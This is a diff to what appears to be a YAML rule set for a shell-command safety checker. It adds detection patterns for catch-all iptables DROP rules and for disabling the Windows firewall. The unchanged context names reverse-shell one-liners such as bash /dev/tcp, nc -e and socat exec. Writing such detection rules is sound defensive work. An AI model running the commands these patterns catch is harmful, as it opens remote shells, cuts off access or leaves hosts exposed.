@@ -71,6 +71,15 @@
   id: network:iptables_default_drop
   severity: High
 - from: network
+  # A catch-all DROP/REJECT appended/inserted on INPUT with no match criteria
+  # before `-j` (`iptables -A INPUT -j DROP`) drops every incoming packet, the
+  # same lockout as a DROP policy. A rule that first matches a host or port
+  # (`-A INPUT -s 1.2.3.4 -j DROP`) is specific and is not flagged.
+  test: (?:^|\s)ip6?tables(?:-legacy|-nft)?\s+(?:\S+\s+)*?(?:-A|-I|--append|--insert)\s+INPUT\s+-j\s+(?:DROP|REJECT)(?:\s|$)
+  description: "This appends a catch-all DROP/REJECT rule to INPUT, dropping all incoming traffic including your SSH session."
+  id: network:iptables_drop_all_input
+  severity: High
+- from: network
   # A reverse shell: an interactive shell wired to a TCP connection
   # (`bash -i >& /dev/tcp/HOST/PORT 0>&1`), `nc -e /bin/sh`, `ncat -c`,
   # `socat … exec:`, or the python pty one-liner. A plain `/dev/tcp` port
@@ -93,3 +102,11 @@
   severity: High
   alternative: "ufw allow OpenSSH"
   alternative_info: "Allow SSH first (then set the default policy), so the session that changes the firewall is not cut off."
+- from: network
+  # Windows firewall turned off: `netsh advfirewall set … state off`, the
+  # legacy `netsh firewall set opmode disable`, or `Set-NetFirewallProfile
+  # -Enabled False`. Parity with the Critical `ufw disable`.
+  test: '(?i)(?:^|\s)(?:netsh(?:\.exe)?\s+advfirewall\s+set\s+\S+\s+state\s+off|netsh(?:\.exe)?\s+firewall\s+set\s+opmode\s+(?:mode=)?disable|Set-NetFirewallProfile\s+(?:\S+\s+)*?-Enabled[:\s]+(?:False|0)\b)'
+  description: "This turns the Windows firewall off, leaving every port open."
+  id: network:disable_firewall_windows
+  severity: Critical
